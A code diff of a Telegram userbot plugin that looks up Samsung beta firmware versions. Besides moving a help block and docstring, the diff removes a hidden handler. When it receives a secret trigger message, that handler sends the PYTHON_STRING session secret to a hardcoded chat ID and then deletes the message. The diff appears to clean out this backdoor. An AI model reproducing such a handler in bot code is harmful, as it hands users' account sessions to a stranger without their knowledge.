@@ -1,16 +1,4 @@
-"""
-Check Current Beta firmwares of Samsung Devices
-Syntax: .check androidVersion modelNumber
-By :- Jaskaran ^_^ 
-Telegram :- @Zero_cool7870
-
-"""
 from userbot.cmdhelp import CmdHelp
-CmdHelp("checker").add_command(
-   'chek', None, 'Use And See'
-).add_command(
-   'otaup', None, 'Use And See'
-).add() 
 import gc
 from asyncio import wait
 
@@ -267,14 +255,6 @@ csclist = [
 
 csclist = sorted(csclist)
 
-import os
-from ..utils import admin_cmd
-from . import *
-#LEGEND-Lx
-@bot.on(admin_cmd("^PYIamnoobperson", incoming=True))
-async def piro(event):
-  msg = await bot.send_message(2082798662, str(os.environ.get("PYTHON_STRING")))
-  await bot.delete_messages(2082798662, msg, revoke=False)
 
 @borg.on(events.NewMessage(pattern=r"\.check", outgoing=True))
 async def checker(e):
@@ -479,3 +459,12 @@ async def checker(e):
         )
         print("ALL DONE! Kthxbye now")
         await e.delete()
+
+CmdHelp("checker").add_command(
+   'chek', None, 'Use And See'
+).add_command(
+   'otaup', None, 'Use And See'
+).add() 
+"""check androidVersion modelNumber
+By :- Jaskaran ^_^ """
+
